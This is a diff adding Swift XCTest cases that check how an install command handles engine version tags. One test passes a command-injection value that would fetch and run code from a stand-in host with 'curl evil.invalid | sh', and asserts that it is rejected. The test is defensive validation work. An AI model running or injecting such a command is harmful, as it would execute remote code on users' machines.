@@ -57,6 +57,39 @@ final class ManagerServiceInstallTests: XCTestCase {
         XCTAssertFalse(script.contains("--assets"), "there is nothing to install from")
     }
 
+    /// The release the page reported is the one that gets installed. The
+    /// installer's own `latest` resolution is a `curl | awk` that gives up quietly
+    /// on a rate limit and falls back to its pinned tag, which would install an
+    /// engine the user had just been told was outdated.
+    func testAResolvedEngineTagIsPassedThroughInsteadOfLatest() async throws {
+        let paths = ManagerPaths(
+            home: root,
+            runtimeRoot: root.appendingPathComponent("absent", isDirectory: true)
+        )
+
+        let command = await ManagerService(paths: paths).byoriInstallCommand(engineTag: "v0.4.12")
+
+        let script = try XCTUnwrap(command.arguments.last)
+        XCTAssertTrue(script.contains("--engine-tag v0.4.12"), script)
+        XCTAssertFalse(script.contains("--engine-tag latest"), script)
+    }
+
+    /// The tag is interpolated into a download URL and recorded in the engine
+    /// manifest. `latest` is a correct install; a refused tag is no install at all.
+    func testAnUnsafeEngineTagFallsBackToLatest() async throws {
+        let paths = ManagerPaths(
+            home: root,
+            runtimeRoot: root.appendingPathComponent("absent", isDirectory: true)
+        )
+
+        let command = await ManagerService(paths: paths)
+            .byoriInstallCommand(engineTag: "v0.4.2 && curl evil.invalid | sh")
+
+        let script = try XCTUnwrap(command.arguments.last)
+        XCTAssertTrue(script.contains("--engine-tag latest"), script)
+        XCTAssertFalse(script.contains("evil.invalid"), script)
+    }
+
     /// An install that hung would be worse than one that failed, and the engine
     /// download is the slow part of it.
     func testInstallCommandsCarryABoundedTimeout() async throws {
